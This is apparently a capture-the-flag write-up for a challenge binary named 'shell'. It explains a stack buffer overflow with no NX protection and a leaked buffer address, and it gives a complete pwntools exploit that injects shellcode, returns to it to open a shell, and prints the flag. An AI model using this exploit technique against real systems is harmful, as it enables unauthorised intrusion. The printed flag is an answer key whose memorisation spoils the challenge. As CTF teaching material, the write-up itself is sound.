
This write up is for the challenge shell

The first thing I did was to first run file and checksec to see the basic protections that the binary had. I saw that it there was no NX meaning that we could inject our own shellcode.

After running the binary one can see that it prints out the location of the start of the buffer, if there is a buffer overflow we have a clear shellcode injection.

I opened it up in ghidra and I saw
```

void read_in(void)

{
  undefined1 local_44 [60];
  
  printf("Buffer location = 0x%08x\n",local_44);
  read(0,local_44,144);
  return;
}
```
This is what I was looking for, now all I need to do is create a script that injects shellcode, pads to the return address and returns to the beginning of our shellcode.

```python
#!/usr/bin/env python3 
import subprocess
from pwn import *

binary_path = './shell' # exe
libc_path = ''
remote_host = 'www.cweaccessionsctf.com'
remote_port = 1305  # <-- Needs to be a valid integer if using REMOTE

context.binary = binary_path
#context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary
#libc = ELF(libc_path)
rop = ROP(elf)
#libc = ELF(libc_path)

if args.GDB:
    p = gdb.debug(binary_path, gdbscript='b *')
elif args.REMOTE:
    p = remote(remote_host, remote_port)
else:
    p = process(binary_path)

def main():
    p.recvuntil(b'location = ')
    buff = p.recvn(10) # Reads in leaked location
    buff = int(buff,16) #cast to packable value
    shellcode = asm(shellcraft.sh())
    payload = b''
    payload += shellcode
    leng = len(shellcode)
    print(leng)
    payload += b'A' * (68 - leng)
    payload += p32(buff)

    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    main()

```
This then pops a shell and we can cat the flag

CWE{popping_shells_is_neat_HRhzM3AR}
<!--stackedit_data:
eyJoaXN0b3J5IjpbNzc4NTg5MjYwXX0=
-->